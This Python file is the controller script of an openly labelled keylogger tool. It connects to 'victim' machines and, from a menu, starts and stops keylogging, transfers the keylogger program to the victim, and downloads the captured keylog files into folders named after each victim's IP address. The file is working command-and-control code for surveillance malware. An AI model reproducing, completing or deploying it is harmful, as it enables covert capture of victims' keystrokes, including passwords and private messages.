import os
import select
from commander_utils import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                              destination_port)

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        # Display menu & prompt user selection
        command = get_menu_selection()

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    perform_menu_item_1(connected_clients)

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    perform_menu_item_2(connected_clients)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients)

                # MENU ITEM 4 - Get Keylog File from Victim
                if command == constants.PERFORM_MENU_ITEM_FOUR:
                    # CASE 1: Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)

                    # CASE 2: Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status) = next(iter(connected_clients.items()))

                        # Check if currently keylogging
                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                            pass
                        else:
                            # Send to victim a notification that it is wanting to receive keylog files
                            print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
                            client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())

                            # Await response if there are any .txt files to transfer
                            print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
                            response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
                            response_status = response[0]
                            response_msg = response[1]
                            print(constants.CLIENT_RESPONSE.format(response_msg))

                            # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
                            if response_status == constants.STATUS_TRUE:
                                main_directory = constants.DOWNLOADS_DIR
                                sub_directory = str(client_ip)

                                # Create the main directory (if it doesn't exist)
                                if not os.path.exists(main_directory):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
                                    os.mkdir(main_directory)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                # Get subdirectory path (downloads/[IP_addr])
                                sub_directory_path = os.path.join(main_directory, sub_directory)

                                # Create subdirectory (if it doesn't exist)
                                if not os.path.exists(sub_directory_path):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
                                    os.mkdir(sub_directory_path)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                # Send ACK response
                                client_socket.send("OK".encode())

                                # Get number of files from client/victim for iteration length
                                number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

                                # Send ACK
                                client_socket.send("OK".encode())

                                # ADD files from client to commander
                                receive_keylog_files(client_socket, number_of_files, sub_directory_path)
                            else:
                                print(constants.RETURN_MAIN_MENU_MSG)
                                print(constants.MENU_CLOSING_BANNER)

                    # CASE 3: Handle a specific client/victim (or if multiple clients)
                    elif len(connected_clients) != constants.ZERO:
                        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
                        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
                        target_socket, target_ip, target_port, status = find_specific_client_socket(connected_clients,
                                                                                                    target_ip,
                                                                                                    target_port)
                        if is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                            pass
                        else:
                            # Send to victim a notification that it is wanting to receive keylog files
                            print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
                            target_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())

                            # Await response if there are any .txt files to transfer
                            print(constants.GET_KEYLOG_PROCESS_MSG.format(target_ip, target_port))
                            response = target_socket.recv(constants.BYTE_LIMIT).decode().split('/')
                            response_status = response[0]
                            response_msg = response[1]
                            print(constants.CLIENT_RESPONSE.format(response_msg))

                            # If any files => create directory (eg: downloads/127.0.0.1) => start file transfer
                            if response_status == constants.STATUS_TRUE:
                                main_directory = constants.DOWNLOADS_DIR
                                sub_directory = str(target_ip)

                                # Create the main directory (if it doesn't exist)
                                if not os.path.exists(main_directory):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
                                    os.mkdir(main_directory)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                # Create the subdirectory within the main directory
                                sub_directory_path = os.path.join(main_directory, sub_directory)

                                # Create subdirectory (if it doesn't exist)
                                if not os.path.exists(sub_directory_path):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
                                    os.mkdir(sub_directory_path)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                # Send ACK response
                                target_socket.send("OK".encode())

                                # Get number of files from client/victim for iteration length
                                number_of_files = target_socket.recv(constants.MIN_BUFFER_SIZE).decode()

                                # Send ACK
                                target_socket.send("OK".encode())

                                # ADD files from client to commander
                                receive_keylog_files(target_socket, number_of_files, sub_directory_path)
                            else:
                                print(constants.RETURN_MAIN_MENU_MSG)
                                print(constants.MENU_CLOSING_BANNER)

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_TWELVE:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)

            #  c) If not server or stdin sockets, then handle data coming from clients
            else:
                # Data is available to read from an existing client connection
                data = sock.recv(constants.BYTE_LIMIT)
                if not data:
                    print("[+] Connection closed by", connected_clients[sock])
                    del connected_clients[sock]
                    sockets_to_read.remove(sock)
                else:
                    print("[+] Received from", connected_clients[sock], ":", data.decode())

                    # Broadcast the received message to all other connected clients
                    for client_sock in connected_clients:
                        if client_sock != sock:
                            try:
                                client_sock.send(data)
                            except Exception as e:
                                print("[+] Error broadcasting to", connected_clients[client_sock], ":", str(e))
